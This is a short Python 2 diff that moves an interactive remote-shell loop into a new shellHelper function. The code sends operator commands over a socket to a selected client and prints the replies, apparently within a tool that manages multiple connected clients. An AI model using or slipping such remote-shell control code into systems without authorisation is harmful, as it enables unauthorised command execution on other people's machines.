@@ -154,14 +154,7 @@ def sendClientShell():
     shellSocket.connect((addr, shellPort))
     shellSocket.send("uname -a")
 
-    while True:
-
-        res = shellSocket.recv(1024)
-        print res
-        cmd = raw_input("[%s]: " % addr)
-
-        if cmd:
-            shellSocket.send(cmd)
+    shellHelper(shellSocket, addr)
 
 
 def selectionHelper(single=False):
@@ -220,6 +213,33 @@ def selectionHelper(single=False):
             return {1: selection[userInput]}
 
     return False
+
+
+def shellHelper(socket, addr, empty=False):
+    if empty:
+
+        cmd = raw_input("[%s]: " % addr)
+
+        if cmd == '':
+            shellHelper(socket, addr, True)
+
+        elif cmd:
+            socket.send(cmd)
+
+    else:
+
+        while True:
+            res = socket.recv(1024)
+            if res and res != 'None':
+                print res
+
+            cmd = raw_input("[%s]: " % addr)
+
+            if cmd == '':
+                shellHelper(socket, addr, True)
+
+            elif cmd:
+                socket.send(cmd)
 
 
 def clientsHelper(options):
